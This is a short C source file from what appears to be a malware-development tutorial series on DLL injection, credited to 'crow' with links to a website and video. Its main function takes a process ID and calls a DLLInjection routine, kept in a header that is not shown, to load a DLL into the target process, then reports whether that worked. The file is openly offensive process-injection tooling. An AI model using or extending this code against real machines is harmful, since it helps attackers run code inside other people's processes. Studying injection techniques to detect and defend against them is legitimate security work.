/*
----------------------------------------------------------------------------------
@culprit: crow
@website: https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection 
@credits: https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection#references 
@youtube: https://youtu.be/A6EKDAKBXPs
----------------------------------------------------------------------------------
*/

#include "injection.h"

int main(int argc, char* argv[]) {

    if (argc < 2) {
        WARN("usage: \"%s\" [PID]", argv[0]);
        return EXIT_FAILURE;
    }

    if (!DLLInjection(
                atoi(argv[1]), 
                DLL, 
                sizeof(DLL) 
    )) {
        WARN("DLL injection failed, exiting...");
        return EXIT_FAILURE;
    }

    OKAY("DLL injection was successful! exiting...");
    return EXIT_SUCCESS;

}
